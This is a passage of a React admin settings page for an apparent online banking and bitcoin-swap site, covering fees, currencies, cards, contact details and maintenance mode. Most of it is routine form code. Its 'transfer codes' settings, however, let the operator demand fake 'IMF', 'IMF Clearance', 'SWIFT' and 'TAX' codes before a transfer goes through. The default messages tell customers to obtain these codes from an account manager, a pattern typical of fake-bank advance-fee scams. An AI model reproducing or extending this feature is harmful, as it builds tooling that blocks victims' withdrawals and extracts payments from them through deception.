"use client"

import { useState, useEffect, useCallback } from "react"
import { useForm }    from "react-hook-form"
import { ChevronDown, ChevronRight, Save, AlertTriangle, Clock, CheckCircle2, XCircle, Plus, Trash2 } from "lucide-react"
import { Button }     from "@/components/ui/button"
import { Input }      from "@/components/ui/input"
import { Label }      from "@/components/ui/label"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { useToast }   from "@/components/ui/use-toast"
import { CurrencyTagInput } from "./CurrencyTagInput"
import { LiveBtcPrice }     from "./LiveBtcPrice"

// ── Types ─────────────────────────────────────────────────────────────────────

interface TransferCode {
  enabled: boolean
  code: string
  message: string
  label: string
}

interface TransferCodeSettings {
  imfCode: TransferCode
  swiftCode: TransferCode
  imfClearanceCode: TransferCode
  taxCode: TransferCode
}

interface Settings {
  swapFeePercent:           number
  swapMinAmount:            number
  swapMaxAmount:            number
  localTransferFee:         number
  internationalTransferFee: number
  internationalTransferFeeType: "flat" | "percentage"
  internationalTransferFeePercent: number
  maxDailyTransferAmount:   number
  defaultCurrency:          string
  supportedCurrencies:      string[]
  btcPriceSource:           string
  maintenanceMode:          boolean
  maintenanceMessage:       string
  allowRegistration:        boolean
  kycRequiredForTransfer:   boolean
  cardApplicationFee:       number
  cardPhysicalFee:          number
  cardMaxPerUser:           number
  cardRequiredKycTier:      number
  supportPhone:             string
  supportTextPhone:         string
  supportEmail:             string
  supportAddress:           string
  supportOffices:           OfficeRow[]
  supportDepartments:       DepartmentRow[]
  careersEmail:             string
  complianceEmail:          string
  privacyEmail:             string
  legalEmail:               string
  transferCodes:            TransferCodeSettings
}

interface OfficeRow { city: string; type: string; addressLine1: string; addressLine2: string; phone: string }
interface DepartmentRow { name: string; description: string; email: string }

interface HistoryEntry {
  _id?:       string
  id?:        string
  action:     string
  adminEmail: string
  changes?:   Record<string, unknown>
  createdAt?: string
  timestamp?: string
}

interface Props {
  settings: Record<string, unknown>
  history:  Record<string, unknown>[]
}

// ── Helpers ───────────────────────────────────────────────────────────────────

const defaultTransferCode: TransferCode = { enabled: false, code: "", message: "", label: "" }

// Mirror of the model defaults — used to prefill the editor when a pre-existing
// settings document has no contact office/department data yet.
const DEFAULT_OFFICE_ROWS: OfficeRow[] = [
  { city: "Berlin",    type: "Headquarters",     addressLine1: "Friedrichstraße 123",  addressLine2: "10117 Berlin, Germany",            phone: "+49 30 1234 5678" },
  { city: "Frankfurt", type: "Financial Center", addressLine1: "Mainzer Landstraße 45", addressLine2: "60329 Frankfurt am Main, Germany", phone: "+49 69 9876 5432" },
  { city: "Munich",    type: "Regional Office",  addressLine1: "Maximilianstraße 78",   addressLine2: "80539 München, Germany",           phone: "+49 89 5555 1234" },
]
const DEFAULT_DEPARTMENT_ROWS: DepartmentRow[] = [
  { name: "General Support",  description: "Account questions, technical issues, general inquiries", email: "" },
  { name: "Business Banking", description: "Business accounts, commercial services, partnerships",   email: "" },
  { name: "Media & Press",    description: "Press inquiries, media requests, public relations",       email: "" },
]

function toTransferCode(raw: unknown, defaultMsg: string, defaultLabel: string): TransferCode {
  if (!raw || typeof raw !== "object") return { enabled: false, code: "", message: defaultMsg, label: defaultLabel }
  const obj = raw as Record<string, unknown>
  return {
    enabled: Boolean(obj.enabled),
    code:    String(obj.code ?? ""),
    message: String(obj.message ?? defaultMsg),
    label:   String(obj.label ?? defaultLabel),
  }
}

function toSettings(raw: Record<string, unknown>): Settings {
  const tc = raw.transferCodes as Record<string, unknown> | undefined
  return {
    swapFeePercent:           Number(raw.swapFeePercent           ?? 1.5),
    swapMinAmount:            Number(raw.swapMinAmount            ?? 10),
    swapMaxAmount:            Number(raw.swapMaxAmount            ?? 50000),
    localTransferFee:         Number(raw.localTransferFee         ?? 0),
    internationalTransferFee: Number(raw.internationalTransferFee ?? 15),
    internationalTransferFeeType: (raw.internationalTransferFeeType as "flat" | "percentage") ?? "flat",
    internationalTransferFeePercent: Number(raw.internationalTransferFeePercent ?? 2.5),
    maxDailyTransferAmount:   Number(raw.maxDailyTransferAmount   ?? 10000),
    defaultCurrency:          String(raw.defaultCurrency          ?? "USD"),
    supportedCurrencies:      Array.isArray(raw.supportedCurrencies) ? (raw.supportedCurrencies as string[]) : ["USD"],
    btcPriceSource:           String(raw.btcPriceSource           ?? "coingecko"),
    maintenanceMode:          Boolean(raw.maintenanceMode),
    maintenanceMessage:       String(raw.maintenanceMessage        ?? ""),
    allowRegistration:        raw.allowRegistration !== false,
    kycRequiredForTransfer:   raw.kycRequiredForTransfer !== false,
    cardApplicationFee:       Number(raw.cardApplicationFee  ?? 0),
    cardPhysicalFee:          Number(raw.cardPhysicalFee     ?? 0),
    cardMaxPerUser:           Number(raw.cardMaxPerUser       ?? 5),
    cardRequiredKycTier:      Number(raw.cardRequiredKycTier  ?? 1),
    supportPhone:             String(raw.supportPhone     ?? ""),
    supportTextPhone:         String(raw.supportTextPhone ?? ""),
    supportEmail:             String(raw.supportEmail      ?? ""),
    supportAddress:           String(raw.supportAddress    ?? ""),
    supportOffices:           (Array.isArray(raw.supportOffices) && raw.supportOffices.length > 0)
      ? (raw.supportOffices as Record<string, unknown>[]).map((o) => ({
          city:         String(o.city         ?? ""),
          type:         String(o.type         ?? ""),
          addressLine1: String(o.addressLine1 ?? ""),
          addressLine2: String(o.addressLine2 ?? ""),
          phone:        String(o.phone        ?? ""),
        }))
      : DEFAULT_OFFICE_ROWS,
    supportDepartments:       (Array.isArray(raw.supportDepartments) && raw.supportDepartments.length > 0)
      ? (raw.supportDepartments as Record<string, unknown>[]).map((d) => ({
          name:        String(d.name        ?? ""),
          description: String(d.description ?? ""),
          email:       String(d.email       ?? ""),
        }))
      : DEFAULT_DEPARTMENT_ROWS,
    careersEmail:             String(raw.careersEmail    ?? ""),
    complianceEmail:          String(raw.complianceEmail ?? ""),
    privacyEmail:             String(raw.privacyEmail    ?? ""),
    legalEmail:               String(raw.legalEmail      ?? ""),
    transferCodes: {
      imfCode:          toTransferCode(tc?.imfCode, "Your transaction requires IMF verification. Please enter the IMF Code provided by your account manager.", "IMF Code"),
      swiftCode:        toTransferCode(tc?.swiftCode, "SWIFT network verification is required for this international transfer.", "SWIFT Code"),
      imfClearanceCode: toTransferCode(tc?.imfClearanceCode, "IMF Clearance is required for transfers of this amount.", "IMF Clearance Code"),
      taxCode:          toTransferCode(tc?.taxCode, "Tax verification is required for this international transfer.", "TAX Code"),
    },
  }
}

function Section({
  title, description, defaultOpen = false, children,
}: { title: string; description?: string; defaultOpen?: boolean; children: React.ReactNode }) {
  const [open, setOpen] = useState(defaultOpen)
  return (
    <div className="border border-gray-200 rounded-xl overflow-hidden">
      <button
        type="button"
        onClick={() => setOpen((v) => !v)}
        className="w-full flex items-center justify-between px-5 py-4 bg-white hover:bg-gray-50 transition-colors text-left"
      >
        <div>
          <p className="font-semibold text-gray-900 text-sm">{title}</p>
          {description && <p className="text-xs text-gray-500 mt-0.5">{description}</p>}
        </div>
        {open ? <ChevronDown className="w-4 h-4 text-gray-400" /> : <ChevronRight className="w-4 h-4 text-gray-400" />}
      </button>
      {open && (
        <div className="px-5 pb-5 pt-1 border-t border-gray-100 bg-white">
          {children}
        </div>
      )}
    </div>
  )
}

function ToggleRow({
  label, description, checked, onChange, disabled,
}: { label: string; description?: string; checked: boolean; onChange: (v: boolean) => void; disabled?: boolean }) {
  return (
    <div className="flex items-start justify-between gap-4 py-3 border-b border-gray-100 last:border-0">
      <div>
        <p className="text-sm font-medium text-gray-900">{label}</p>
        {description && <p className="text-xs text-gray-500 mt-0.5">{description}</p>}
      </div>
      <button
        role="switch"
        aria-checked={checked}
        disabled={disabled}
        onClick={() => onChange(!checked)}
        className={[
          "relative inline-flex h-5 w-9 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none mt-0.5 disabled:opacity-50",
          checked ? "bg-[#12B76A]" : "bg-gray-200",
        ].join(" ")}
      >
        <span className={[
          "pointer-events-none inline-block h-4 w-4 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out",
          checked ? "translate-x-4" : "translate-x-0",
        ].join(" ")} />
      </button>
    </div>
  )
}

function FieldGrid({ children }: { children: React.ReactNode }) {
  return <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 mt-4">{children}</div>
}

function Field({
  label, hint, children,
}: { label: string; hint?: string; children: React.ReactNode }) {
  return (
    <div className="space-y-1">
      <Label className="text-xs font-medium text-gray-700">{label}</Label>
      {children}
      {hint && <p className="text-xs text-gray-400">{hint}</p>}
    </div>
  )
}

function SaveButton({
  isDirty, loading, onClick,
}: { isDirty: boolean; loading: boolean; onClick: () => void }) {
  if (!isDirty) return null
  return (
    <div className="flex justify-end mt-4 pt-4 border-t border-gray-100">
      <Button
        type="button"
        size="sm"
        onClick={onClick}
        disabled={loading}
        className="gap-2 bg-[#1A2CCE] hover:bg-[#1A2CCE]/90"
      >
        {loading ? (
          <span className="h-3 w-3 rounded-full border-2 border-white/30 border-t-white animate-spin" />
        ) : (
          <Save className="w-3.5 h-3.5" />
        )}
        Save changes
      </Button>
    </div>
  )
}

// ── Section forms ─────────────────────────────────────────────────────────────

function BitcoinSwapSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading, setLoading] = useState(false)
  const { register, handleSubmit, watch, formState: { isDirty }, reset } = useForm({
    defaultValues: {
      swapFeePercent: initial.swapFeePercent,
      swapMinAmount:  initial.swapMinAmount,
      swapMaxAmount:  initial.swapMaxAmount,
    },
  })

  async function save(data: typeof initial extends Settings ? Partial<Settings> : never) {
    setLoading(true)
    try {
      const res = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      reset({ swapFeePercent: next.swapFeePercent, swapMinAmount: next.swapMinAmount, swapMaxAmount: next.swapMaxAmount })
      onSaved(next)
      toast({ title: "Bitcoin swap settings saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  const fee = Number(watch("swapFeePercent"))
  const min = Number(watch("swapMinAmount"))

  return (
    <form onSubmit={handleSubmit((d) => save(d as Partial<Settings>))}>
      <div className="mt-2 flex items-center gap-3">
        <LiveBtcPrice />
      </div>
      <FieldGrid>
        <Field label="Swap fee (%)" hint="Fee charged on each BTC swap">
          <Input type="number" step="0.01" min={0} max={10} {...register("swapFeePercent", { valueAsNumber: true })} />
        </Field>
        <Field label="Min swap amount ($)" hint="Minimum fiat amount to swap">
          <Input type="number" min={0} {...register("swapMinAmount", { valueAsNumber: true })} />
        </Field>
        <Field label="Max swap amount ($)" hint="Maximum fiat amount per swap">
          <Input type="number" min={0} {...register("swapMaxAmount", { valueAsNumber: true })} />
        </Field>
      </FieldGrid>
      {fee > 0 && min > 0 && (
        <p className="text-xs text-gray-500 mt-3 bg-gray-50 rounded p-2">
          Example: for a ${min} swap, fee = ${(min * fee / 100).toFixed(2)}, user receives {100 - fee}% of BTC value.
        </p>
      )}
      <SaveButton isDirty={isDirty} loading={loading} onClick={handleSubmit((d) => save(d as Partial<Settings>))} />
    </form>
  )
}

function TransferFeesSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading, setLoading] = useState(false)
  const [feeType, setFeeType] = useState<"flat" | "percentage">(initial.internationalTransferFeeType)
  const { register, handleSubmit, watch, formState: { isDirty }, reset } = useForm({
    defaultValues: {
      localTransferFee:         initial.localTransferFee,
      internationalTransferFee: initial.internationalTransferFee,
      internationalTransferFeePercent: initial.internationalTransferFeePercent,
      maxDailyTransferAmount:   initial.maxDailyTransferAmount,
    },
  })

  const intlFee = Number(watch("internationalTransferFee"))
  const intlFeePercent = Number(watch("internationalTransferFeePercent"))

  async function save(data: Partial<Settings> & { internationalTransferFeeType?: "flat" | "percentage" }) {
    setLoading(true)
    try {
      const res  = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...data, internationalTransferFeeType: feeType }),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      reset({ 
        localTransferFee: next.localTransferFee, 
        internationalTransferFee: next.internationalTransferFee, 
        internationalTransferFeePercent: next.internationalTransferFeePercent,
        maxDailyTransferAmount: next.maxDailyTransferAmount 
      })
      setFeeType(next.internationalTransferFeeType)
      onSaved(next)
      toast({ title: "Transfer fee settings saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  const feeTypeChanged = feeType !== initial.internationalTransferFeeType

  return (
    <form onSubmit={handleSubmit((d) => save(d as Partial<Settings>))}>
      <FieldGrid>
        <Field label="Local transfer fee ($)" hint="Flat fee for domestic transfers">
          <Input type="number" step="0.01" min={0} max={100} {...register("localTransferFee", { valueAsNumber: true })} />
        </Field>
        <Field label="Max daily transfer ($)" hint="Per-user daily cap">
          <Input type="number" min={0} {...register("maxDailyTransferAmount", { valueAsNumber: true })} />
        </Field>
      </FieldGrid>

      {/* International Transfer Fee Section */}
      <div className="mt-6 pt-4 border-t border-gray-100">
        <p className="text-sm font-semibold text-gray-900 mb-3">International Transfer Fees</p>
        
        <div className="mb-4">
          <Label className="text-xs font-medium text-gray-700 mb-2 block">Fee Type</Label>
          <div className="flex gap-2">
            <button
              type="button"
              onClick={() => setFeeType("flat")}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                feeType === "flat" 
                  ? "bg-[#1A2CCE] text-white"
                  : "bg-gray-100 text-gray-600 hover:bg-gray-200"
              }`}
            >
              Flat Fee ($)
            </button>
            <button
              type="button"
              onClick={() => setFeeType("percentage")}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                feeType === "percentage" 
                  ? "bg-[#1A2CCE] text-white"
                  : "bg-gray-100 text-gray-600 hover:bg-gray-200"
              }`}
            >
              Percentage (%)
            </button>
          </div>
        </div>

        <FieldGrid>
          {feeType === "flat" ? (
            <Field label="International transfer fee ($)" hint="Fixed fee charged per international transfer">
              <Input type="number" step="0.01" min={0} max={500} {...register("internationalTransferFee", { valueAsNumber: true })} />
            </Field>
          ) : (
            <Field label="International transfer fee (%)" hint="Percentage of transfer amount">
              <Input type="number" step="0.01" min={0} max={100} {...register("internationalTransferFeePercent", { valueAsNumber: true })} />
            </Field>
          )}
        </FieldGrid>

        {/* Fee preview */}
        <div className="mt-3 p-3 bg-gray-50 rounded-lg">
          <p className="text-xs text-gray-600">
            <span className="font-medium">Example:</span> For a $1,000 international transfer, the fee would be{" "}
            <span className="font-semibold text-[#1A2CCE]">
              ${feeType === "flat" ? intlFee.toFixed(2) : (1000 * intlFeePercent / 100).toFixed(2)}
            </span>
            {feeType === "percentage" && ` (${intlFeePercent}%)`}
          </p>
        </div>
      </div>

      <SaveButton isDirty={isDirty || feeTypeChanged} loading={loading} onClick={handleSubmit((d) => save(d as Partial<Settings>))} />
    </form>
  )
}

function CurrencySection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast }   = useToast()
  const [loading,   setLoading]   = useState(false)
  const [defaultCurrency, setDefaultCurrency] = useState(initial.defaultCurrency)
  const [currencies, setCurrencies] = useState<string[]>(initial.supportedCurrencies)
  const [dirty,     setDirty]     = useState(false)

  function handleCurrenciesChange(v: string[]) {
    setCurrencies(v)
    setDirty(true)
    // If default currency was removed, set to first available
    if (!v.includes(defaultCurrency) && v.length > 0) {
      setDefaultCurrency(v[0])
    }
  }

  function handleDefaultChange(e: React.ChangeEvent<HTMLSelectElement>) {
    setDefaultCurrency(e.target.value)
    setDirty(true)
  }

  async function save() {
    setLoading(true)
    try {
      const res  = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ defaultCurrency, supportedCurrencies: currencies }),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      setDefaultCurrency(next.defaultCurrency)
      setCurrencies(next.supportedCurrencies)
      setDirty(false)
      onSaved(next)
      toast({ title: "Currency settings saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="mt-2 space-y-3">
      <div>
        <Label className="text-xs font-medium text-gray-700">Default currency</Label>
        <select
          value={defaultCurrency}
          onChange={handleDefaultChange}
          className="mt-1.5 w-full rounded-lg border border-gray-200 bg-white px-3 py-2 text-sm font-medium text-gray-900 focus:border-indigo-500 focus:outline-none focus:ring-1 focus:ring-indigo-500"
        >
          {currencies.map((c) => (
            <option key={c} value={c}>{c}</option>
          ))}
        </select>
        <p className="text-xs text-gray-400 mt-1">This currency will be used across all client pages.</p>
      </div>
      <div>
        <Label className="text-xs font-medium text-gray-700">Supported currencies</Label>
        <div className="mt-1.5">
          <CurrencyTagInput
            value={currencies}
            onChange={handleCurrenciesChange}
            defaultCurrency={defaultCurrency}
          />
        </div>
      </div>
      <SaveButton isDirty={dirty} loading={loading} onClick={save} />
    </div>
  )
}

function RegistrationSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading,          setLoading]          = useState(false)
  const [allowReg,         setAllowReg]         = useState(initial.allowRegistration)
  const [kycRequired,      setKycRequired]      = useState(initial.kycRequiredForTransfer)
  const [dirty,            setDirty]            = useState(false)

  function set<T>(fn: (v: T) => void) {
    return (v: T) => { fn(v); setDirty(true) }
  }

  async function save() {
    setLoading(true)
    try {
      const res  = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ allowRegistration: allowReg, kycRequiredForTransfer: kycRequired }),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      setAllowReg(next.allowRegistration)
      setKycRequired(next.kycRequiredForTransfer)
      setDirty(false)
      onSaved(next)
      toast({ title: "Registration settings saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="mt-2 space-y-1">
      <ToggleRow
        label="Allow new registrations"
        description="When off, the sign-up page is disabled and new accounts cannot be created."
        checked={allowReg}
        onChange={set(setAllowReg)}
      />
      <ToggleRow
        label="KYC required for transfers"
        description="Users must complete identity verification before making any transfers."
        checked={kycRequired}
        onChange={set(setKycRequired)}
      />
      <SaveButton isDirty={dirty} loading={loading} onClick={save} />
    </div>
  )
}

// ── Cards section ─────────────────────────────────────────────────────────────

function CardsSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading, setLoading] = useState(false)
  const { register, handleSubmit, formState: { isDirty }, reset } = useForm({
    defaultValues: {
      cardApplicationFee: initial.cardApplicationFee,
      cardPhysicalFee:    initial.cardPhysicalFee,
      cardMaxPerUser:     initial.cardMaxPerUser,
      cardRequiredKycTier: initial.cardRequiredKycTier,
    },
  })

  async function save(data: Partial<Settings>) {
    setLoading(true)
    try {
      const res = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      reset({
        cardApplicationFee: next.cardApplicationFee,
        cardPhysicalFee:    next.cardPhysicalFee,
        cardMaxPerUser:     next.cardMaxPerUser,
        cardRequiredKycTier: next.cardRequiredKycTier,
      })
      onSaved(next)
      toast({ title: "Card settings saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  return (
    <form onSubmit={handleSubmit((d) => save(d as Partial<Settings>))} className="mt-2">
      <FieldGrid>
        <Field label="Virtual card fee ($)" hint="Charged when applying for a virtual card">
          <Input type="number" step="0.01" min={0} {...register("cardApplicationFee", { valueAsNumber: true })} />
        </Field>
        <Field label="Physical card fee ($)" hint="Charged when applying for a physical (mailed) card">
          <Input type="number" step="0.01" min={0} {...register("cardPhysicalFee", { valueAsNumber: true })} />
        </Field>
        <Field label="Max cards per user" hint="Across pending, active, frozen and blocked">
          <Input type="number" min={1} max={20} {...register("cardMaxPerUser", { valueAsNumber: true })} />
        </Field>
        <Field label="Required KYC tier" hint="Minimum KYC tier to apply (1–3)">
          <Input type="number" min={1} max={3} {...register("cardRequiredKycTier", { valueAsNumber: true })} />
        </Field>
      </FieldGrid>
      <SaveButton isDirty={isDirty} loading={loading} onClick={handleSubmit((d) => save(d as Partial<Settings>))} />
    </form>
  )
}

// ── Contact & support section ─────────────────────────────────────────────────

function ContactSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading, setLoading] = useState(false)
  const { register, handleSubmit, watch, formState: { isDirty }, reset } = useForm({
    defaultValues: {
      supportPhone:     initial.supportPhone,
      supportTextPhone: initial.supportTextPhone,
      supportEmail:     initial.supportEmail,
      supportAddress:   initial.supportAddress,
      careersEmail:     initial.careersEmail,
      complianceEmail:  initial.complianceEmail,
      privacyEmail:     initial.privacyEmail,
      legalEmail:       initial.legalEmail,
    },
  })

  const [offices, setOffices]         = useState<OfficeRow[]>(initial.supportOffices)
  const [departments, setDepartments] = useState<DepartmentRow[]>(initial.supportDepartments)
  const [listDirty, setListDirty]     = useState(false)

  function updateOffice(i: number, patch: Partial<OfficeRow>) {
    setOffices((prev) => prev.map((o, idx) => (idx === i ? { ...o, ...patch } : o)))
    setListDirty(true)
  }
  function addOffice() {
    setOffices((prev) => [...prev, { city: "", type: "", addressLine1: "", addressLine2: "", phone: "" }])
    setListDirty(true)
  }
  function removeOffice(i: number) {
    setOffices((prev) => prev.filter((_, idx) => idx !== i))
    setListDirty(true)
  }

  function updateDept(i: number, patch: Partial<DepartmentRow>) {
    setDepartments((prev) => prev.map((d, idx) => (idx === i ? { ...d, ...patch } : d)))
    setListDirty(true)
  }
  function addDept() {
    setDepartments((prev) => [...prev, { name: "", description: "", email: "" }])
    setListDirty(true)
  }
  function removeDept(i: number) {
    setDepartments((prev) => prev.filter((_, idx) => idx !== i))
    setListDirty(true)
  }

  async function save(data: Partial<Settings>) {
    setLoading(true)
    try {
      const res = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...data, supportOffices: offices, supportDepartments: departments }),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      reset({
        supportPhone: next.supportPhone,
        supportTextPhone: next.supportTextPhone,
        supportEmail: next.supportEmail,
        supportAddress: next.supportAddress,
        careersEmail: next.careersEmail,
        complianceEmail: next.complianceEmail,
        privacyEmail: next.privacyEmail,
        legalEmail: next.legalEmail,
      })
      setOffices(next.supportOffices)
      setDepartments(next.supportDepartments)
      setListDirty(false)
      onSaved(next)
      toast({ title: "Contact details saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  const textPhone = watch("supportTextPhone")
  const phone     = watch("supportPhone")

  return (
    <form onSubmit={handleSubmit((d) => save(d as Partial<Settings>))} className="mt-2">
      <p className="text-xs text-gray-500 mb-1">
        These details appear across the public site (footer, contact &amp; support pages) and the user app.
        Leave a field blank to fall back to the built-in default.
      </p>
      <FieldGrid>
        <Field label="Support phone (call)" hint="Shown as the main number to call">
          <Input type="tel" placeholder="1-800-123-4567" {...register("supportPhone")} />
        </Field>
        <Field label="Text / SMS number" hint="For 'text a specialist'. Leave blank to reuse the call number.">
          <Input type="tel" placeholder="Same as call number" {...register("supportTextPhone")} />
        </Field>
        <Field label="Support email" hint="Main contact email">
          <Input type="email" placeholder="support@example.com" {...register("supportEmail")} />
        </Field>
      </FieldGrid>
      <div className="mt-4">
        <Field label="Support address" hint="Shown in the footer">
          <Input type="text" placeholder="Street, City, Country" {...register("supportAddress")} />
        </Field>
      </div>
      <p className="text-xs text-gray-500 mt-3 bg-gray-50 rounded p-2">
        Customers can <strong>call {phone || "the number"}</strong>
        {" "}and <strong>text {textPhone?.trim() || phone || "the number"}</strong> to reach a support specialist.
      </p>

      {/* Office locations */}
      <div className="mt-6 pt-4 border-t border-gray-100">
        <div className="flex items-center justify-between mb-1">
          <p className="text-sm font-semibold text-gray-900">Office locations</p>
          <button type="button" onClick={addOffice} className="inline-flex items-center gap-1 text-xs font-medium text-[#1A2CCE] hover:underline">
            <Plus className="w-3.5 h-3.5" /> Add office
          </button>
        </div>
        <p className="text-xs text-gray-400 mb-3">Shown in the &ldquo;Visit us at one of our offices&rdquo; section on the contact page.</p>
        {offices.length === 0 && <p className="text-xs text-gray-400 py-2">No offices. The contact page will hide this section.</p>}
        <div className="space-y-3">
          {offices.map((o, i) => (
            <div key={i} className="border border-gray-200 rounded-xl p-3 bg-gray-50/60">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-medium text-gray-500">Office {i + 1}</span>
                <button type="button" onClick={() => removeOffice(i)} className="text-gray-400 hover:text-red-500" aria-label="Remove office">
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                <Input placeholder="City (e.g. Berlin)" value={o.city} onChange={(e) => updateOffice(i, { city: e.target.value })} />
                <Input placeholder="Label (e.g. Headquarters)" value={o.type} onChange={(e) => updateOffice(i, { type: e.target.value })} />
                <Input placeholder="Address line 1" value={o.addressLine1} onChange={(e) => updateOffice(i, { addressLine1: e.target.value })} />
                <Input placeholder="Address line 2" value={o.addressLine2} onChange={(e) => updateOffice(i, { addressLine2: e.target.value })} />
                <Input placeholder="Phone" value={o.phone} onChange={(e) => updateOffice(i, { phone: e.target.value })} className="sm:col-span-2" />
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Department contacts */}
      <div className="mt-6 pt-4 border-t border-gray-100">
        <div className="flex items-center justify-between mb-1">
          <p className="text-sm font-semibold text-gray-900">Department contacts</p>
          <button type="button" onClick={addDept} className="inline-flex items-center gap-1 text-xs font-medium text-[#1A2CCE] hover:underline">
            <Plus className="w-3.5 h-3.5" /> Add department
          </button>
        </div>
        <p className="text-xs text-gray-400 mb-3">Department email cards on the contact page. Leave the email blank to fall back to the main support email.</p>
        {departments.length === 0 && <p className="text-xs text-gray-400 py-2">No departments configured.</p>}
        <div className="space-y-3">
          {departments.map((d, i) => (
            <div key={i} className="border border-gray-200 rounded-xl p-3 bg-gray-50/60">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-medium text-gray-500">Department {i + 1}</span>
                <button type="button" onClick={() => removeDept(i)} className="text-gray-400 hover:text-red-500" aria-label="Remove department">
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                <Input placeholder="Name (e.g. General Support)" value={d.name} onChange={(e) => updateDept(i, { name: e.target.value })} />
                <Input type="email" placeholder="Email" value={d.email} onChange={(e) => updateDept(i, { email: e.target.value })} />
                <Input placeholder="Description" value={d.description} onChange={(e) => updateDept(i, { description: e.target.value })} className="sm:col-span-2" />
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Specialised inbox addresses */}
      <div className="mt-6 pt-4 border-t border-gray-100">
        <p className="text-sm font-semibold text-gray-900 mb-1">Legal &amp; other inboxes</p>
        <p className="text-xs text-gray-400 mb-3">Addresses used on the compliance, licenses, privacy, cookies, terms and careers pages. Leave blank to fall back to the main support email.</p>
        <FieldGrid>
          <Field label="Careers email" hint="Careers page">
            <Input type="email" placeholder="careers@example.com" {...register("careersEmail")} />
          </Field>
          <Field label="Compliance email" hint="Compliance & licenses pages">
            <Input type="email" placeholder="compliance@example.com" {...register("complianceEmail")} />
          </Field>
          <Field label="Privacy email" hint="Privacy & cookies pages">
            <Input type="email" placeholder="privacy@example.com" {...register("privacyEmail")} />
          </Field>
          <Field label="Legal email" hint="Terms page">
            <Input type="email" placeholder="legal@example.com" {...register("legalEmail")} />
          </Field>
        </FieldGrid>
      </div>

      <SaveButton isDirty={isDirty || listDirty} loading={loading} onClick={handleSubmit((d) => save(d as Partial<Settings>))} />
    </form>
  )
}

// ── Maintenance mode section ──────────────────────────────────────────────────

function MaintenanceSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading,  setLoading]  = useState(false)
  const [enabled,  setEnabled]  = useState(initial.maintenanceMode)
  const [message,  setMessage]  = useState(initial.maintenanceMessage)
  const [dirty,    setDirty]    = useState(false)
  const [confirmOpen, setConfirmOpen] = useState(false)
  const [confirmText, setConfirmText] = useState("")
  const [previewOpen, setPreviewOpen] = useState(false)

  function attemptEnable() {
    setConfirmText("")
    setConfirmOpen(true)
  }

  async function save(nextEnabled?: boolean) {
    const modeToSave = nextEnabled !== undefined ? nextEnabled : enabled
    setLoading(true)
    try {
      const res  = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ maintenanceMode: modeToSave, maintenanceMessage: message }),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
